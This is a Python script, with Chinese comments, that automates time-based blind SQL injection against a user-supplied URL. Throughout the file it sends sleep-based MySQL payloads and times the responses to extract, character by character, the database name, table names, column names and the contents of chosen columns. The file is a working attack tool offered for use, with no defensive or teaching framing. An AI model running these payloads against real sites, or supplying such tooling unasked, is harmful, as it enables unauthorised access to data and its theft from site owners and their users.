# -*- coding: UTF-8 -*-
 
import requests
import time
 
DBName = ""  # 数据库名的变量
DBTables = []
DBColumns = []
DBData = {}
 
requests.adapters.DEFAULT_RETRIES = 10
conn = requests.session()
conn.keep_alive = False  # 设置重连次数（自行调整），连接活跃状态为False
 
 
# 盲注主函数
def StartSqli(url):
    GetDBName(url)
    print("[+]当前数据库名:{0}".format(DBName))
    GetDBTables(url, DBName)
    print("[+]数据库{0}的表如下:".format(DBName))
    for item in range(len(DBTables)):
        print("(" + str(item + 1) + ")" + DBTables[item])
    tableIndex = int(input("[*]请输入要查看表的序号:")) - 1
    GetDBColumns(url, DBName, DBTables[tableIndex])
    while True:
        print("[+]数据表{0}的字段如下:".format(DBTables[tableIndex]))
        for item in range(len(DBColumns)):
            print("(" + str(item + 1) + ")" + DBColumns[item])
        columnIndex = int(input("[*]请输入要查看字段的序号(输入0退出):")) - 1
        if (columnIndex == -1):
            break
        else:
            GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])
 
 
# 数据库名
def GetDBName(url):
    # 引用全局变量用来存放当前使用的数据名
    global DBName
    print('[-]开始获取数据库名的长度')
    DBNameLen = 0
    payload = '1 and if(length(database())={0},sleep(3),0) %23'
    targetUrl = url + payload
    # 用遍历得出数据库的长度
    for DBNameLen in range(1, 99):
        # 开始时间
        timestart = time.time()
        # 访问
        res = requests.get(targetUrl.format(DBNameLen))
        timeend = time.time()
        if timeend - timestart >= 3:
            print('[+]数据库的长度：' + str(DBNameLen))
            break
    print('[-]开始获取数据库名')
    payload = '1 and if(ascii(substr(database(),{0},1))={1},sleep(3),0) %23'
    targetUrl = url + payload
    for a in range(1, DBNameLen + 1):
        for b in range(33, 127):
            # 开始时间
            timestart = time.time()
            # 访问
            res = requests.get(targetUrl.format(a, b))
            timeend = time.time()
            if timeend - timestart >= 3:
                DBName += chr(b)
                print('[-]' + DBName)
                break
 
 
# 表名
def GetDBTables(url, dbname):
    global DBTables
    # 初始数据库表的数量为0
    print('[-]开始获取{0}数据库表的数量：'.format(dbname))
    payload = "1 and if((select count(table_name) from information_schema.tables where table_schema='{0}')={1},sleep(3),0) %23"
    targetUrl = url + payload
    # 开始遍历获取数据库表的数量
    for DBTableCount in range(1, 99):
        timeStart = time.time()
        res = requests.get(targetUrl.format(dbname, DBTableCount))
        timeEnd = time.time()
        if timeEnd - timeStart >= 3:
            print("[+]{0}数据库的表数量为:{1}".format(dbname, DBTableCount))
            break
    print('[-]开始获取{0}数据库的表'.format(dbname))
    # 遍历完表数量后，开始遍历表的长度
    tableLen = 0
    # 根据表的数量猜解表的长度
    for a in range(0, DBTableCount):
        print('[-]正在获取第{0}个表名'.format(a + 1))
        for tableLen in range(1, 99):
            payload = "1 and if((select length(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},sleep(3),0) %23"
            targetUrl = url + payload
            timeStart = time.time()
            res = requests.get(targetUrl.format(dbname, a, tableLen))
            timeEnd = time.time()
            if timeEnd - timeStart >= 3:
                break
        # 通过表名长度获取表名
        table = ''
        for b in range(1, tableLen + 1):  # sqli   |  第一个表|第一个表第一个字符串|第一个表第一个字符串的ascii码
            payload = "1 and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},sleep(3),0)%23"
            targetUrl = url + payload
            # c表示从33~127w位ascii码
            for c in range(33, 128):
                timeStart = time.time()
                res = conn.get(targetUrl.format(dbname, a, b, c))
                timeEnd = time.time()
                if timeEnd - timeStart >= 3:
                    table += chr(c)
                    print(table)
                    break
        # 将获取到的表追加至DBTables这个表中
        DBTables.append(table)
        table = ''  # 清空
 
 
# 字段：字段个数-->字段长度-->字段名
def GetDBColumns(url, dbname, dbtable):
    try:
        global DBColumns
        DBColumnCount = 0
        print('[-]开始获取{0}数据表的字段数：'.format(dbtable))
        for DBColumnCount in range(1, 99):
            #                                                                                               数据库             数据库第一个表名|字段数量
            payload = "1 and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},sleep(3),0) %23"
            targetUrl = url + payload
            timeStart = time.time()
            res = requests.get(targetUrl.format(dbname, dbtable, DBColumnCount))
            timeEnd = time.time()
            if timeEnd - timeStart >= 3:
                print("[-]{0}数据表的字段数为:{1}".format(dbtable, DBColumnCount))
                break
        # 获取字段的长度后获取字段名
        column = ''
        for a in range(0, DBColumnCount):
            print('[-]正在获取第{0}个字段名'.format(a + 1))
            # 先获取字段的长度
            for columnLen in range(99):
                #                                                                                                 数据库               表名         第一个字段|第一个字段长度
                payload = "1 and if((select length(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1)={3},sleep(3),0) %23"
                targetUrl = url + payload
                timeStart = time.time()
                res = requests.get(targetUrl.format(dbname, dbtable, a, columnLen))
                timeEnd = time.time()
                if timeEnd - timeStart >= 3:
                    break
                    # b表示当前字段名猜解的位置
            for b in range(1, columnLen + 1):
                payload = "1 and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1),{3},1))={4},sleep(3),0) %23"
                targetUrl = url + payload
                # c表示33~127位ASCII中可显示字符
                for c in range(33, 128):
                    timeStart = time.time()
                    res = conn.get(targetUrl.format(dbname, dbtable, a, b, c))
                    timeEnd = time.time()
                    if timeEnd - timeStart >= 3:
                        column += chr(c)
                        print(column)
                        break
            # 把获取到的名加入到DBColumns
            DBColumns.append(column)
            # 清空column，用来继续获取下一个字段名
            column = ""
    except requests.exceptions.ConnectionError as ganyu:
        GetDBColumns(url, dbname, dbtable)
 
 
# 字段数据
def GetDBData(url, dbtable, dbcolumn):
    try:
        global DBData
        # 获取字段的数量
        DBDataCount = 0
        print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable, dbcolumn))
        for DBDataCount in range(0, 99):
            payload = "1 and if((select count({0}) from {1})={2},sleep(3),0) %23"
            targetUrl = url + payload
            timeStart = time.time()
            res = requests.get(targetUrl.format(dbcolumn, dbtable, DBDataCount))
            timeEed = time.time()
            if timeEed - timeStart >= 3:
                print("[-]{0}表{1}字段的数据数量为:{2}".format(dbtable, dbcolumn, DBDataCount))
                break
        for a in range(0, DBDataCount):
            print("[-]正在获取{0}的第{1}个数据".format(dbcolumn, a + 1))
            # 获取这个数据的长度
            dataLen = 0
            for dataLen in range(99):
                payload = "1 and  if((select length({0}) from {1} limit {2},1)={3},sleep(3),0) %23"
                targetUrl = url + payload
                timeStart = time.time()
                res = conn.get(targetUrl.format(dbcolumn, dbtable, a, dataLen))
                timeEnd = time.time()
                if timeEnd - timeStart >= 3:
                    print("[-]第{0}个数据长度为:{1}".format(a + 1, dataLen))
                    break
            data = ''
            # 获取数据的具体内容
            for b in range(1, dataLen + 1):
                for c in range(33, 128):
                    payload = "1 and  if(ascii(substr((select {0} from {1} limit {2},1),{3},1))={4},sleep(3),0) %23"
                    targetUrl = url + payload
                    timeStart = time.time()
                    res = conn.get(targetUrl.format(dbcolumn, dbtable, a, b, c))
                    timeEnd = time.time()
                    if timeEnd - timeStart >= 3:
                        data += chr(c)
                        print(data)
                        break
            # 放到以字段名为键，值为列表的字典中存放
            DBData.setdefault(dbcolumn, []).append(data)
            print(DBData)
            # 把data清空来，继续获取下一个数据
            data = ""
    except requests.exceptions.ConnectionError as ganyu:
        GetDBData(url, dbtable, dbcolumn)
 
 
ganyu = input('url:')
StartSqli(ganyu)
